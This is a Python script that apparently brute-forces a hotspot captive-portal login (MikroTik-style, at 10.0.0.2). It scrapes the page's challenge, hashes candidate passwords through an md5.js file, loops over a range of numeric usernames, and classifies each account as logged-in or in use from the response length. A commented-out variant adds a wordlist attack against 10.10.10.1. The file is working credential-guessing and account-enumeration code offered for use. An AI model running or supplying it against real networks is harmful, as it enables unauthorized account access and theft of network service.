import os
import time

import js2py
import requests


def first_html():
	url = "http://10.0.0.2/login"
	html_attempt = requests.get(url)
	html = html_attempt.text
	return html

def scrap(html):
	start = html.find("5('") 
	end = html.find("');",start)
	p_data = html[start+3:end]
	f_data = p_data.replace("' + document.login.password.value + '","")
	return f_data

def password_gen(data):
	path = os.path.join(os.path.dirname(__file__),"md5.js")
	md5_file = open(path,"r",encoding="utf-8")
	js = str(md5_file.read())
	js_data = js.replace('HeRe',data)
	password = js2py.eval_js(js_data)
	md5_file.close()
	return password

def login(user,password):
	t1 = time.time()
	url = "http://10.0.0.2:80/login"
	L_data = {"username": user,
		   "password": password,
		   "dst": "",
		   "popup": "true"
		}
	login_attempt = requests.post(url, data = L_data,timeout=10 )
	response = login_attempt.headers['Content-Length']
	check = int(response) - len(str(user))
	page = login_attempt.text

	if check < 1600:
		stat = " loged \a"
		requests.get("http://10.0.0.2/logout")
		loged_u.append(user)
		page = first_html()
	elif check < 3500:
		stat = " Used" 
		used_u.append(user)
	else:
		stat = "     "
	t2 = time.time()
	total = t2 -t1 
	print("" + str(user) + ": " + stat + " \t\t\tTime: " , total)
	return password_gen(scrap(page))

if __name__ == '__main__':
	first_user = int(input('First User: '))
	last_user = int(input('Last User: '))
	used_u, loged_u= [], []
	pas = password_gen(scrap(first_html()))
	for user in range(first_user,last_user+1):
		done = False
		while not done:
			try:
				pas = login(user,pas)
				done = True
			except:
				pass 
	print("USED:   ", used_u)
	print("LOGGED: ", loged_u)

# import os
# import time
# import js2py
# import requests

# def load_wordlist(filename):
#     with open(filename, "r") as file:
#         wordlist = [line.strip() for line in file]
#     return wordlist

# def first_html():
#     url = "http://10.10.10.1/login"
#     html_attempt = requests.get(url)
#     html = html_attempt.text
#     return html

# def scrap(html):
#     start = html.find("5('") 
#     end = html.find("');",start)
#     p_data = html[start+3:end]
#     f_data = p_data.replace("' + document.login.password.value + '","")
#     return f_data

# def password_gen(data):
#     path = os.path.join(os.path.dirname(__file__),"md5.js")
#     md5_file = open(path,"r",encoding="utf-8")
#     js = str(md5_file.read())
#     js_data = js.replace('HeRe',data)
#     password = js2py.eval_js(js_data)
#     md5_file.close()
#     return password

# def login(user,password):
#     # print(f"INI PASSWORD YANG DI CEK {password}")
#     t1 = time.time()
#     url = "http://10.10.10.1/login"
#     L_data = {
#         "username": f"A{user}", 
#         "password": password,
#         "dst": "",
#         "popup": "true"
#     }
#     print(L_data)
#     login_attempt = requests.post(url, data=L_data, timeout=10 )
#     response = login_attempt.headers['Content-Length']
#     check = int(response) - len(str(user))
#     page = login_attempt.text

#     if check < 1600:
#         stat = " loged \a"
#         requests.get("http://10.10.10.1/logout")
#         loged_u.append(user)
#         page = first_html()
#     elif check < 3500:
#         stat = " Used" 
#         used_u.append(user)
#     else:
#         stat = "     "
#     t2 = time.time()
#     total = t2 -t1 
#     print("" + str(user) + ": " + stat + " \t\t\tTime: " , total)
#     return password_gen(scrap(page))

# if __name__ == '__main__':
#     wordlist = load_wordlist("mk_password.txt")  # Baca daftar kata dari file
#     first_user = int(input('First User: '))
#     last_user = int(input('Last User: '))
#     used_u, loged_u = [], []

#     for user in range(first_user, last_user + 1):
#         done = False
#         for password in wordlist:
#             try:
#                 pas = login(user, password_gen(password))
#                 done = True
#                 break  # Keluar dari loop jika berhasil login
#             except:
#                 pass

#         if not done:
#             print(f"User {user}: All passwords failed")

#     print("USED:   ", used_u)
#     print("LOGGED: ", loged_u)